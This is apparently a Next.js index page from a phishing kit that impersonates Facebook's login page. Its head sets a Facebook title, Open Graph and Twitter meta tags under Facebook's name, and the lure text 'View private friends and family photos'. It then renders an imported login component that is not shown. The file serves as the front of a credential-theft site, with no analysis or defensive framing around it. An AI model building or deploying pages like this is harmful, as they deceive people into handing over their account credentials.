import Head from "next/head";
import Image from "next/image";
import { Inter } from "next/font/google";
import styles from "@/styles/Home.module.css";
import LoginPage from "./login";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  return (
    <>
      <Head>
        <title>Facebook - Log in to Facebook</title>
        <meta
          name="description"
          content="View private friends and family photos."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
        {/* OG meta tags */}
        <meta name="og:title" content="Facebook - Log in to Facebook" />
        <meta name="og:type" content="website" />
        <meta name="og:site_name" content="Facebook" />
        <meta
          name="og:description"
          content="View private friends and family photos."
        />
        <meta name="og:image" content="/og-image/fb_icon_325x325.png" />
        <meta name="og:url" content="index.html" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:site" content="@facebook" />
        <meta name="twitter:creator" content="@facebook" />
        <meta name="twitter:title" content="Facebook" />
        <meta
          name="twitter:description"
          content="View private friends and family photos."
        />
      </Head>
      <LoginPage />
    </>
  );
}
